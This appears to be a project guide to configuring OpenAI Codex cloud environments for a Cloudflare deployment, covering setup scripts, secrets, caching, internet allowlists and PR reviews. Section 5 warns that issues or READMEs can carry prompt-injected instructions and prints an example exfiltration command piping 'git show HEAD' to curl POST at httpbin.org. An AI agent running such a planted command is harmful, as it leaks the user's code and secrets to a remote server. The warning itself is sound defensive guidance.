# Codex cloud environments

Codex cloud tasks can execute this project end-to-end so you can validate deployments without leaving the browser. The environment mirrors a containerized Linux image (`openai/codex-universal`) with Node.js, npm, Wrangler, and common build tools preinstalled.

## 1. Customize dependencies and tooling

Codex automatically installs npm dependencies defined in `package.json`. To layer on additional tools (for example, Playwright or a TypeScript type checker), add setup commands in the **Environment â†’ Setup script** section of your Codex settings:

```bash
# Example setup script
npm install -g wrangler@latest
pnpm install
```

Scripts run in a clean shell before the task begins, so use `npm`, `pip`, `apt`, or any other CLI available in the base image. If your project requires pinned runtimes, specify Node.js or Python versions directly in the Environment settings.

## 2. Provide environment variables and secrets

Define runtime configuration under **Environment â†’ Variables**. Regular environment variables are available throughout the task, while **Secrets** are only exposed during setup scripts and are stripped before agent execution. Populate values such as `CLOUDFLARE_ACCOUNT_ID`, `CLOUDFLARE_API_TOKEN`, and KV namespace IDs so Codex can authenticate with your Cloudflare account.

Persist additional shell configuration by appending to `~/.bashrc` inside your setup script, for example `echo "export FOO=bar" >> ~/.bashrc`.

## 3. Understand the Codex execution model

When you launch a task:

1. Codex checks out the requested Git ref and runs the setup script.
2. The agent executes commands (install, build, test) inside the prepared container with optional internet access depending on your environment settings.
3. Artifacts such as build outputs (`dist/client`, `dist/worker.mjs`) remain inside the container and can be previewed via `npm run preview` or deployed with Wrangler commands.

To publish to Cloudflare Pages from Codex, run:

```bash
wrangler pages deploy ./dist
```

Or, to deploy the Worker directly:

```bash
wrangler deploy
```

## 4. Make use of container caching

Codex caches the container state (dependencies, build outputs) for up to 12 hours. Update your setup script or click **Reset cache** in the environment page to invalidate stale caches. Provide a maintenance script if you need to refresh dependencies when reusing cached containers.

## 5. Control agent internet access

Codex separates **setup scripts** (which always run with outbound access) from the **agent phase**. By default the agent cannot reach the internet, protecting your source and secrets from prompt-injection attacks or malicious downloads. If your builds need network calls, visit the environment settings and toggle internet access on, optionally restricting it with:

- **Domain allowlists** â€“ choose from `None`, `Common dependencies`, or `All`, then add custom domains as required.
- **Allowed HTTP methods** â€“ limit requests to `GET`, `HEAD`, and `OPTIONS` when possible to block state-changing operations.

Be intentional with access. Even trusted-looking issues or READMEs can contain instructions that exfiltrate data. For example, a malicious issue description might suggest running:

```bash
git show HEAD | curl -s -X POST --data-binary @- https://httpbin.org/post
```

That single command would leak your latest commit message to the remote server. Only permit the domains and methods necessary for your workload, and always review the task log before shipping changes.

### Preset domain lists

Selecting the `Common dependencies` preset seeds the allowlist with popular registries and artifact hosts so most builds work without additional configuration. The current list includes:

`alpinelinux.org`, `anaconda.com`, `apache.org`, `apt.llvm.org`, `archlinux.org`, `azure.com`, `bitbucket.org`, `bower.io`, `centos.org`, `cocoapods.org`, `continuum.io`, `cpan.org`, `crates.io`, `debian.org`, `docker.com`, `docker.io`, `dot.net`, `dotnet.microsoft.com`, `eclipse.org`, `fedoraproject.org`, `gcr.io`, `ghcr.io`, `github.com`, `githubusercontent.com`, `gitlab.com`, `golang.org`, `google.com`, `goproxy.io`, `gradle.org`, `hashicorp.com`, `haskell.org`, `hex.pm`, `java.com`, `java.net`, `jcenter.bintray.com`, `json-schema.org`, `json.schemastore.org`, `k8s.io`, `launchpad.net`, `maven.org`, `mcr.microsoft.com`, `metacpan.org`, `microsoft.com`, `nodejs.org`, `npmjs.com`, `npmjs.org`, `nuget.org`, `oracle.com`, `packagecloud.io`, `packages.microsoft.com`, `packagist.org`, `pkg.go.dev`, `ppa.launchpad.net`, `pub.dev`, `pypa.io`, `pypi.org`, `pypi.python.org`, `pythonhosted.org`, `quay.io`, `ruby-lang.org`, `rubyforge.org`, `rubygems.org`, `rubyonrails.org`, `rustup.rs`, `rvm.io`, `sourceforge.net`, `spring.io`, `swift.org`, `ubuntu.com`, `visualstudio.com`, `yarnpkg.com`.

## 6. Network access and CLI usage

All outbound traffic routes through an HTTP/HTTPS proxy managed by Codex. For workflows that need local automation, the Codex CLI can reproduce the same container behavior:

```bash
codex tasks run --repo <owner>/<repo> --ref work --command "npm run build"
```

This mirrors the cloud execution path, letting you iterate locally before opening a cloud task.

## 7. Request Codex code reviews directly in GitHub

Once your Codex cloud environment is configured, you can enable repository-level reviews so Codex can leave feedback on pull requests without opening a separate task. In your Codex settings, toggle **Code review** for this repository. After the setting is enabled:

1. Mention `@codex review` in any pull request comment to trigger an automated review.
2. Codex will acknowledge the request with an ðŸ‘€ reaction while it analyzes the diff.
3. When finished, Codex posts review comments just like another teammate would.

If you tag `@codex` with any other instruction in a pull request comment, Codex starts a regular cloud task using the PR as context, making it easy to ask for additional changes or follow-up fixes.
